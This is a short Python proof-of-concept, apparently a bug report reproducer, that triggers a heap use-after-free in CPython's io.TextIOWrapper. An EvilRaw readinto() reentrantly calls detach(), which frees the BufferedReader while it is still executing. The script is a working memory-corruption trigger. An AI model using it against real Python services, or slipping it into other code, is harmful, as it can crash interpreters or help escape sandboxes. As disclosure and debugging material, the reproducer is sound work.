"""
Heap-use-after-free in _io.TextIOWrapper via reentrant detach().

TextIOWrapper.read() calls self->buffer.read() through a *borrowed* reference
(buffer_access_safe, textio.c:740).  The underlying raw readinto() runs user
code that calls tw.detach(), which clears self->buffer and hands the only
reference to the (C-implemented) BufferedReader to the caller.  Discarding it
frees the BufferedReader while its read_impl() is still on the C stack
-> UAF write at bufferedio.c:1022.

Pure Python, no ctypes.
"""
import io

class EvilRaw(io.RawIOBase):
    def readable(self):
        return True
    def readinto(self, b):
        # Reentrantly detach the TextIOWrapper: drops the last reference to
        # the BufferedReader that is currently executing read() above us.
        tw.detach()
        b[:3] = b"abc"
        return 3

tw = io.TextIOWrapper(io.BufferedReader(EvilRaw()), encoding="utf-8")
tw.read()
print("NO CRASH")
